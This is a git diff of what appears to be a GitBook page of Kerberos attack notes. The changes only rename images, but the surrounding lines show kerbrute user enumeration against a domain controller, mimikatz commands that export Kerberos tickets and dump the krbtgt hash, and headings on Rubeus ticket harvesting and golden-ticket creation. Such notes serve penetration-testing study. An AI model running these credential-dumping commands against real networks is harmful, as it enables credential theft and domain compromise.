@@ -49,7 +49,7 @@ This will brute force user accounts from a domain controller using a supplied wo
 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Harvesting & Brute-Forcing Tickets w/ Rubeus
 
@@ -182,7 +182,7 @@ privilege::debug
 sekurlsa::tickets /export
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (6) (7).png" alt=""><figcaption></figcaption></figure>
 
@@ -235,7 +235,7 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Create a Golden/Silver Ticket
 
